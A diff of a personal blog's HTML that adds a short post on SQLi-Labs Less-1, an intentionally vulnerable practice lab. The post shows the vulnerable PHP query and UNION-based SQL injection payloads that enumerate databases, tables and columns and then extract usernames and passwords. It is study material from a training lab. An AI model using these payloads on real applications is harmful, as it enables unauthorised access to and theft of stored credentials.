@@ -17,10 +17,23 @@
   <meta name="description" content="">
   <meta name="author" content="Chinggg">
   <meta name="keywords" content="">
-  <title>Archives - Ching</title>
+  <title>SQLi-Labs - Ching</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
 
 
 <!-- 主题依赖的图标库，不要自行修改 -->
@@ -43,7 +56,7 @@
 
 
 <body>
-  <header style="height: 60vh;">
+  <header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
@@ -147,6 +160,43 @@
             </span>
 
             
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-02-16 19:19" pubdate>
+        February 16, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      102 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      2
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
           </div>
 
           
@@ -157,106 +207,118 @@
 
   <main>
     
-      <div class="container nopadding-md">
-        <div class="py-5" id="board"
-          >
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
-
-<div class="list-group">
-  <p class="h4">15 posts in total.</p>
-  <hr>
-  
-    
       
-      <p class="h5">2021</p>
-    
-    <a href="/2021/02/16/SQLi-Labs/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">SQLi-Labs</span>
-      <time style="float: right;">02-16</time>
-    </a>
-  
-    
-    <a href="/2021/02/10/MCM2021/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">MCM2021</span>
-      <time style="float: right;">02-10</time>
-    </a>
-  
-    
-    <a href="/2021/01/17/CTF2021/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">2021年CTF赛事复盘</span>
-      <time style="float: right;">01-17</time>
-    </a>
-  
-    
-      
-      <p class="h5">2020</p>
-    
-    <a href="/2020/12/30/Suicide/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">自杀研究：读书报告与案例分析</span>
-      <time style="float: right;">12-30</time>
-    </a>
-  
-    
-    <a href="/2020/12/16/Early-Work/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">Early Work</span>
-      <time style="float: right;">12-16</time>
-    </a>
-  
-    
-    <a href="/2020/11/29/CTF-Web/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">CTF-Web</span>
-      <time style="float: right;">11-29</time>
-    </a>
-  
-    
-    <a href="/2020/11/20/DevFest2020/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">GDG Shanghai DevFest2020</span>
-      <time style="float: right;">11-20</time>
-    </a>
-  
-    
-    <a href="/2020/11/19/CPPP/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">CPPP</span>
-      <time style="float: right;">11-19</time>
-    </a>
-  
-    
-    <a href="/2020/11/06/CTF2020/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">2020年CTF赛事复盘</span>
-      <time style="float: right;">11-06</time>
-    </a>
-  
-    
-    <a href="/2020/11/03/C-Pointer/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">C指针复盘</span>
-      <time style="float: right;">11-03</time>
-    </a>
-  
-</div>
 
-  <nav aria-label="navigation">
-    <span class="pagination" id="pagination">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/"><i class="iconfont icon-arrowright"></i></a>
-    </span>
-  </nav>
-  
-  <script>
-    for (ele of document.getElementById("pagination").getElementsByTagName("a")) {
-      ele.href += '#board';
-    }
-  </script>
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">SQLi-Labs</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h2 id="less-1-error-based-single-quotes-string"><a class="markdownIt-Anchor" href="#less-1-error-based-single-quotes-string"></a> Less-1  Error Based - Single quotes - String</h2>
+<pre><code class="hljs php">$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</code></pre>
+<p><code>1' order by 4--+</code> says <em>Unknown column ‘4’</em> , so only three columns</p>
+<p><code>-1' UNION SELECT 1,database(),3--+</code></p>
+<p><code>-1' UNION SELECT 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p>
+<p><code>-1' UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+</code></p>
+<p><code>-1' UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+</code></p>
+<p><code>-1' UNION SELECT 1,username,password from users where id=2--+</code></p>
+<table>
+<thead>
+<tr>
+<th>SELECT</th>
+<th>FROM</th>
+<th>WHERE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>schema_name</td>
+<td>information_schema.schemata</td>
+<td>/</td>
+</tr>
+<tr>
+<td>table_name</td>
+<td>information_shcema.tables</td>
+<td>table_schema=’[schema_name]’</td>
+</tr>
+<tr>
+<td>column_name</td>
+<td>information_schema.columns</td>
+<td>table_name=’[table_name]’</td>
+</tr>
+</tbody>
+</table>
 
-
-
-              </div>
             </div>
-          </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E8%AE%B0%E5%BD%95/">记录</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E9%95%BF%E6%9C%9F/">长期</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/02/10/MCM2021/">
+                        <span class="hidden-mobile">MCM2021</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
         </div>
       </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
     
   </main>
 
@@ -331,6 +393,31 @@
 
 
 
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
 
 
   <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
@@ -338,7 +425,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "Archive&nbsp;",
+        "SQLi-Labs&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
@@ -353,6 +440,21 @@
 
 
 
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
 
 
   <script  src="/js/local-search.js" ></script>
@@ -366,6 +468,20 @@
   </script>
 
 
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
 
 
 
